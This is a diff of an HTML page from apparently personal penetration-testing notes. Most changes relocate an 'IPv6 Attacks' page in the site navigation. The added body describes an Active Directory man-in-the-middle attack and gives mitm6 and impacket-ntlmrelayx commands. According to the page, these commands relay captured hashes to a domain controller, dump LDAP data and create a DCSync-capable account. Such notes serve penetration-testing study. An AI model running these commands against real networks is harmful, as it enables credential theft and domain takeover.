@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/IPv6%20Attacks/">
+        <link rel="canonical" href="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/IPv6%20Attacks/">
       
       
-        <link rel="prev" href="../Group%20Policy%20Abuse/">
+        <link rel="prev" href="../GPP%20Password/">
       
       
-        <link rel="next" href="../Kerberos%20Double%20Hop/">
+        <link rel="next" href="../LLMNR%20Poisoning/">
       
       
       <link rel="icon" href="../../../assets/favicon.ico">
@@ -61,7 +61,7 @@
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/Lateral Movement/IPv6 Attacks.png" >
+        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/Initial Access & Delivery/IPv6 Attacks.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -69,7 +69,7 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/IPv6%20Attacks/" >
+        <meta  property="og:url"  content="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/IPv6%20Attacks/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
@@ -77,7 +77,7 @@
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/Lateral Movement/IPv6 Attacks.png" >
+        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/Initial Access & Delivery/IPv6 Attacks.png" >
       
     
     
@@ -98,6 +98,11 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#mitm6-ntlmrelayx" class="md-skip">
+          Skip to content
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -838,7 +843,7 @@
   
   
   <span class="md-ellipsis">
-    Index
+    Under Construction
     
   </span>
   
@@ -2610,6 +2615,8 @@
                 
   
   
+    
+  
   
   
     
@@ -2620,11 +2627,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_6" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_6" checked>
         
           
           <label class="md-nav__link" for="__nav_7_6" id="__nav_7_6_label" tabindex="0">
@@ -2640,7 +2647,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_6_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_6_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_7_6">
             <span class="md-nav__icon md-icon"></span>
             Initial Access & Delivery
@@ -2654,7 +2661,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/GPP%20Password/" class="md-nav__link">
+      <a href="../GPP%20Password/" class="md-nav__link">
         
   
   
@@ -2674,10 +2681,80 @@
                 
   
   
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    IPv6 Attacks
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    IPv6 Attacks
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#mitm6-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      mitm6 + ntlmrelayx
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/" class="md-nav__link">
+      <a href="../LLMNR%20Poisoning/" class="md-nav__link">
         
   
   
@@ -2700,7 +2777,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/LNK%20File%20Attacks/" class="md-nav__link">
+      <a href="../LNK%20File%20Attacks/" class="md-nav__link">
         
   
   
@@ -2723,7 +2800,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/NetNTLM%20Hash%20Stealing%20Locations/" class="md-nav__link">
+      <a href="../NetNTLM%20Hash%20Stealing%20Locations/" class="md-nav__link">
         
   
   
@@ -2746,7 +2823,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/Password%20Stuff/" class="md-nav__link">
+      <a href="../Password%20Stuff/" class="md-nav__link">
         
   
   
@@ -2769,7 +2846,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/PetitPotam%20%28MS-EFSRPC%29/" class="md-nav__link">
+      <a href="../PetitPotam%20%28MS-EFSRPC%29/" class="md-nav__link">
         
   
   
@@ -2792,7 +2869,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/Word%20Doc%20Macro/" class="md-nav__link">
+      <a href="../Word%20Doc%20Macro/" class="md-nav__link">
         
   
   
@@ -2815,7 +2892,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/ZeroLogon/" class="md-nav__link">
+      <a href="../ZeroLogon/" class="md-nav__link">
         
   
   
@@ -2843,8 +2920,6 @@
                 
   
   
-    
-  
   
   
     
@@ -2855,11 +2930,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_7" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_7" >
         
           
           <label class="md-nav__link" for="__nav_7_7" id="__nav_7_7_label" tabindex="0">
@@ -2875,7 +2950,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_7_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_7_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_7_7">
             <span class="md-nav__icon md-icon"></span>
             Lateral Movement
@@ -2889,7 +2964,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Alternate%20Service%20Name/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Alternate%20Service%20Name/" class="md-nav__link">
         
   
   
@@ -2912,7 +2987,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Constrained%20Delegation/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Constrained%20Delegation/" class="md-nav__link">
         
   
   
@@ -2935,7 +3010,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Domain%20ACLs/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Domain%20ACLs/" class="md-nav__link">
         
   
   
@@ -2958,7 +3033,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Group%20Policy%20Abuse/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Group%20Policy%20Abuse/" class="md-nav__link">
         
   
   
@@ -2978,41 +3053,10 @@
                 
   
   
-    
-  
-  
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
-        
-  
-  
-  <span class="md-ellipsis">
-    IPv6 Attacks
-    
-  </span>
-  
-
-      </a>
-      
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
   
   
     <li class="md-nav__item">
-      <a href="../Kerberos%20Double%20Hop/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Kerberos%20Double%20Hop/" class="md-nav__link">
         
   
   
@@ -3035,7 +3079,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../MSSQL%20Abuse/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/MSSQL%20Abuse/" class="md-nav__link">
         
   
   
@@ -3058,7 +3102,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Microsoft%20Configuration%20Manager/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Microsoft%20Configuration%20Manager/" class="md-nav__link">
         
   
   
@@ -3081,7 +3125,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Pivoting/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Pivoting/" class="md-nav__link">
         
   
   
@@ -3104,7 +3148,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Relay%20Attacks/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Relay%20Attacks/" class="md-nav__link">
         
   
   
@@ -3127,7 +3171,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Resource-Based%20Constrained%20Delegation/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Resource-Based%20Constrained%20Delegation/" class="md-nav__link">
         
   
   
@@ -3150,7 +3194,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../SMB/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/SMB/" class="md-nav__link">
         
   
   
@@ -3173,7 +3217,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Service%20for%20User%20to%20Self/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Service%20for%20User%20to%20Self/" class="md-nav__link">
         
   
   
@@ -3196,7 +3240,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Unconstrained%20Delegation/" class="md-nav__link">
+      <a href="../../Lateral%20Movement/Unconstrained%20Delegation/" class="md-nav__link">
         
   
   
@@ -3619,6 +3663,23 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#mitm6-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      mitm6 + ntlmrelayx
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -3638,7 +3699,18 @@
 
   <h1>IPv6 Attacks</h1>
 
-
+<p>IPv6 has been adopted slowly and thus underutilized in environments. If IPv6 name resolution is enabled, but a proper DNS server has not been setup to respond to queries, we can man-in-the-middle by using Web Proxy Auto-Discovery Protocol (WPAD) resolution requests to capture and relay hashes to the DC.</p>
+<div class="admonition alert">
+<p class="admonition-title"> this attack is most consistently triggered on machine reboot or network stack reload so early mornings are probably the best time to perform this attack</p>
+</div>
+<h2 id="mitm6-ntlmrelayx">mitm6 + ntlmrelayx</h2>
+<p><strong>Start mitm6</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>mitm6<span class="w"> </span>-d<span class="w"> </span>domain.local
+</span></code></pre></div>
+Now start ntlmrelayx, specify a relay target (DC prolly) will output ldapdomaindump as HTML as well. 
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>impacket-ntlmrelayx<span class="w"> </span>-6<span class="w"> </span>-t<span class="w"> </span>ldaps://&lt;DCIP&gt;<span class="w"> </span>-wh<span class="w"> </span>wpad.domain.local<span class="w"> </span>-l<span class="w"> </span>lootme
+</span></code></pre></div>
+These options instruct ntlmrelayx to do an ldapdomaindump if user hashes are relayed, and create an account with DCSync privileges if a domain admins hash is relayed.</p>
 
 
 
